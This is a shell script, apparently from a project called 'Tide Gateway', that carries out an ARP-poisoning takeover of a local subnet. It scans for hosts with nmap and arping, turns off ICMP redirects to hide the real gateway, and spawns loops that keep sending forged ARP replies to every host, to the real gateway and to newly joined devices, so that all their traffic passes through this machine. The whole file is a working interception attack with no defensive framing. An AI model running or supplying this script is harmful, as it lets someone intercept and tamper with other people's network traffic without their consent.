#!/bin/sh
# Tide Gateway - ARP Takeover Script
# Aggressively hijacks subnet traffic and forces it through Tor

set -e

INTERFACE="${1:-eth0}"
SUBNET="${2:-10.101.101.0/24}"
GATEWAY_IP="${3:-10.101.101.10}"

echo "🚨 INITIATING ARP TAKEOVER"
echo "   Interface: $INTERFACE"
echo "   Subnet: $SUBNET"
echo "   Spoofing as gateway: $GATEWAY_IP"

# Install required tools if not present
if ! command -v arping >/dev/null 2>&1; then
    echo "📦 Installing ARP tools..."
    apk add --no-cache iputils arping >/dev/null 2>&1 || true
fi

# Enable promiscuous mode (capture all packets)
echo "🔓 Enabling promiscuous mode..."
ip link set "$INTERFACE" promisc on

# Enable IP forwarding (already done, but ensure)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Disable ICMP redirects (prevents exposing the real gateway)
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/"$INTERFACE"/send_redirects

# Get network info
NETWORK=$(echo "$SUBNET" | cut -d'/' -f1 | cut -d'.' -f1-3)
NETMASK=$(echo "$SUBNET" | cut -d'/' -f2)

echo "🔍 Discovering devices on network..."

# Scan subnet to discover active hosts
ACTIVE_HOSTS=$(nmap -sn "$SUBNET" 2>/dev/null | grep "Nmap scan report" | awk '{print $NF}' | tr -d '()' || echo "")

if [ -z "$ACTIVE_HOSTS" ]; then
    # Fallback: use arping to discover hosts
    echo "   Using arping for discovery..."
    ACTIVE_HOSTS=$(for i in $(seq 1 254); do
        IP="${NETWORK}.$i"
        arping -c 1 -I "$INTERFACE" "$IP" 2>/dev/null | grep -q "bytes from" && echo "$IP"
    done)
fi

# Count discovered hosts
HOST_COUNT=$(echo "$ACTIVE_HOSTS" | grep -v "^$" | wc -l)
echo "   Found $HOST_COUNT active hosts"

# Start ARP poisoning for each discovered host
echo "💉 Starting ARP poisoning attack..."

# Create ARP poison script
cat > /tmp/arp-poison.sh << 'POISON'
#!/bin/sh
TARGET_IP=$1
INTERFACE=$2
GATEWAY_IP=$3

while true; do
    # Send gratuitous ARP claiming we are the gateway
    arping -U -c 1 -I "$INTERFACE" -s "$GATEWAY_IP" "$TARGET_IP" >/dev/null 2>&1
    
    # Send ARP reply claiming we are the default gateway for this target
    arping -A -c 1 -I "$INTERFACE" -s "$GATEWAY_IP" "$TARGET_IP" >/dev/null 2>&1
    
    sleep 2
done
POISON

chmod +x /tmp/arp-poison.sh

# Launch ARP poisoning for each host
for HOST in $ACTIVE_HOSTS; do
    if [ "$HOST" != "$GATEWAY_IP" ] && [ "$HOST" != "${NETWORK}.1" ]; then
        echo "   Poisoning: $HOST"
        /tmp/arp-poison.sh "$HOST" "$INTERFACE" "$GATEWAY_IP" &
    fi
done

# Also poison the actual gateway (if exists) to intercept return traffic
REAL_GATEWAY="${NETWORK}.1"
echo "   Poisoning real gateway: $REAL_GATEWAY"
/tmp/arp-poison.sh "$REAL_GATEWAY" "$INTERFACE" "$GATEWAY_IP" &

# Broadcast gratuitous ARP continuously
echo "📡 Broadcasting gratuitous ARP as default gateway..."
(
    while true; do
        # Broadcast: "I am the gateway for everyone"
        arping -U -c 1 -I "$INTERFACE" "$GATEWAY_IP" >/dev/null 2>&1
        sleep 5
    done
) &

# Monitor and re-poison new devices joining network
echo "👁️  Monitoring for new devices..."
(
    SEEN_HOSTS=$(mktemp)
    echo "$ACTIVE_HOSTS" > "$SEEN_HOSTS"
    
    while true; do
        sleep 10
        
        # Re-scan network
        NEW_HOSTS=$(nmap -sn "$SUBNET" 2>/dev/null | grep "Nmap scan report" | awk '{print $NF}' | tr -d '()' || echo "")
        
        for NEW_HOST in $NEW_HOSTS; do
            if ! grep -q "$NEW_HOST" "$SEEN_HOSTS"; then
                echo "   🎯 NEW DEVICE DETECTED: $NEW_HOST - Poisoning immediately!"
                echo "$NEW_HOST" >> "$SEEN_HOSTS"
                /tmp/arp-poison.sh "$NEW_HOST" "$INTERFACE" "$GATEWAY_IP" &
            fi
        done
    done
) &

echo "✅ ARP TAKEOVER ACTIVE"
echo "   All subnet traffic will be intercepted and routed through Tor"
echo "   Press Ctrl+C to stop (WARNING: May leave network in poisoned state)"

# Keep script running
wait
